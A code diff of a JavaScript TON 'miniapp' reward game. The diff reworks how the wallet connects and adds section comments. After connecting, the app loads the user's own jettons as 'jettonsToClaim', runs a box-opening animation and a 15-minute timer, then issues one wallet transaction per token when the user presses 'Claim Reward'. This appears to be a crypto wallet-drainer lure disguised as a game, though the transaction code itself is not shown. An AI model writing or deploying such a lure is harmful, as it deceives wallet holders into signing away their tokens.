@@ -4,34 +4,45 @@ let timerInterval;
 let jettonsToClaim = [];
 let currentIndex = 0;
 
-document.getElementById("connectBtn").onclick = async () => {
+// ---------- Connect Wallet ----------
+document.getElementById("connectBtn").onclick = () => {
     try {
         ui = new TON_CONNECT_UI.TonConnectUI({
             manifestUrl: "https://emperator16.github.io/miniapp/tonconnect-manifest.json"
         });
 
-        await ui.connect();
-        walletAddress = ui.wallet.account.address;
+        ui.show(); // نمایش modal Wallet popup
 
-        alert("Wallet connected: " + walletAddress);
+        // event listener برای وضعیت اتصال
+        ui.onStatusChange((status) => {
+            if (status.type === 'connected') {
+                walletAddress = status.account.address;
+                console.log("Wallet connected:", walletAddress);
+                alert("Wallet connected: " + walletAddress);
 
-        document.getElementById("connectDiv").style.display = "none";
-        document.getElementById("gameDiv").style.display = "block";
+                document.getElementById("connectDiv").style.display = "none";
+                document.getElementById("gameDiv").style.display = "block";
 
-        jettonsToClaim = await fetchUserJettons(walletAddress);
+                fetchUserJettons(walletAddress).then(jettons => {
+                    jettonsToClaim = jettons;
+                });
+            }
+        });
     } catch(e) {
         console.error("Connection failed:", e);
         alert("Wallet connection failed.");
     }
 };
 
+// ---------- Play Game ----------
 document.getElementById("playBtn").onclick = () => {
     document.getElementById("gameDiv").style.display = "none";
     document.getElementById("rewardDiv").style.display = "block";
     document.getElementById("animationDiv").innerHTML = '<img src="images/box-open.gif">';
-    startTimer(15 * 60);
+    startTimer(15 * 60); // 15 دقیقه
 };
 
+// ---------- Timer ----------
 function startTimer(duration) {
     let time = duration;
     timerInterval = setInterval(() => {
@@ -48,6 +59,7 @@ function startTimer(duration) {
     }, 1000);
 }
 
+// ---------- Claim Reward ----------
 document.getElementById("claimBtn").onclick = async () => {
     document.getElementById("rewardDiv").style.display = "none";
     await processNextClaim();
@@ -96,13 +108,15 @@ async function processNextClaim() {
         alert("Transaction failed or cancelled.");
         document.getElementById("rewardDiv").style.display = "block";
     }
-}
+};
 
+// ---------- Play Again ----------
 document.getElementById("playAgainBtn").onclick = () => {
     document.getElementById("successDiv").style.display = "none";
     document.getElementById("gameDiv").style.display = "block";
 };
 
+// ---------- Fetch Jettons ----------
 async function fetchUserJettons(address) {
     // جای RPC یا Toncenter API قرار دهید
     return [
